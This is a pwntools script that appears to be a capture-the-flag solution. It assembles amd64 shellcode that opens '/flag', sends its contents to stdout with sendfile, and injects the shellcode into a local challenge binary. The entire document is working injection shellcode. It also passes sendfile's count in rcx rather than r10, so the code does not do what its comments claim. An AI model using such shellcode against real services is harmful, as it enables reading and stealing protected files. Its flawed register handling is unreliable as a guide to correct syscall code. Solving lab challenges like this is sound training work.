from pwn import *

# set some context
context.arch = "amd64"
context.encoding = "latin"
# ignore warnings
warnings.simplefilter("ignore")

# assembly goes here, most of the rest is boilerplate
assembly = f"""
// since the challenge hasn't asked us to do anything specific,
// we'll just read the flag
// here sendfile(2) can be used, which's more efficient as well

// open("/flag", NULL);

mov rax, SYS_open
// push the flag string on stack
mov rcx, 0x{ enhex( b"/flag"[::-1] ) }
push rcx
mov rdi, rsp
xor rsi, rsi
syscall

// sendfile(1, open(), 0, 1000)
mov rsi, rax
mov rax, SYS_sendfile
mov rdi, 1
mov rdx, 0
// flag is 55 chars long
mov rcx, 55
syscall

// exit(0)
mov rax, SYS_exit
xor rdi, rdi
syscall
"""


# the hostname will always be the same as challenge binary
with process(f"/challenge/{os.getenv('HOSTNAME')}") as target:
    info( target.readrepeat(1) )
    target.send( asm(assembly) )
    info( target.readrepeat(1) )
